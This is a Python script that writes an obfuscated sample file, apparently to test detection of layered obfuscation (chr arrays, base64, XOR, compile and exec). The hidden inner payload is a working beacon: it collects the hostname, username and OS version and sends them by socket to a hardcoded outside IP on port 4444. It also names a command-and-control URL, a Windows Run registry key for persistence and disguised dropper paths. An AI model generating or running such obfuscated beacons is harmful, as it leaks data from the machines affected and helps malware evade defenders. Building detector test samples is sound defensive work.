import base64

XOR_KEY = 42

inner = (
    'import platform, socket\n'
    'import os\n'
    '\n'
    '_host    = socket.gethostname()\n'
    '_user    = __import__("os").environ.get("USERNAME", __import__("os").environ.get("USER", "unknown"))\n'
    '_os_ver  = platform.platform()\n'
    '\n'
    '_c2_host     = "185.220.101.47"\n'
    '_c2_port     = 4444\n'
    '_beacon_url  = "http://185.220.101.47:8080/gate.php"\n'
    '_reg_key     = "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"\n'
    '_dropper_win = "C:\\\\Users\\\\Public\\\\WindowsUpdate32.exe"\n'
    '_dropper_nix = "/tmp/.systemd-private-cache"\n'
    '\n'
    '_info = f"[beacon] host={_host} user={_user} os={_os_ver}"\n'
    '\n'
    'try:\n'
    '    _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n'
    '    _s.settimeout(0.01)\n'
    '    _s.connect((_c2_host, _c2_port))\n'
    '    _s.sendall(_info.encode())\n'
    '    _s.close()\n'
    'except Exception:\n'
    '    pass\n'
    '\n'
    'import os as _os\n'
    '_os.system("echo " + _info)\n'
)

xored = bytes(ord(c) ^ XOR_KEY for c in inner)
b64   = base64.b64encode(xored).decode()

chr_decode  = list(ord(c) for c in 'decode')
chr_latin   = list(ord(c) for c in 'latin-1')

sample = f"""# layers: chr-array, __import__, base64, XOR lambda, compile+exec

_dec_fn  = ''.join(map(chr, {chr_decode}))
_enc_fn  = ''.join(map(chr, {chr_latin}))

import base64 as _b64
_raw  = _b64.b64decode({b64!r})
_xor  = lambda s: ''.join(chr(ord(c) ^ {XOR_KEY}) for c in s)
_src  = _xor(getattr(_raw, _dec_fn)(_enc_fn))
_code = compile(_src, '<payload>', 'exec')
exec(_code)
"""

with open('samples/sample_realistic.py', 'w') as f:
    f.write(sample)

print("Written samples/sample_realistic.py")
print()
print(sample)
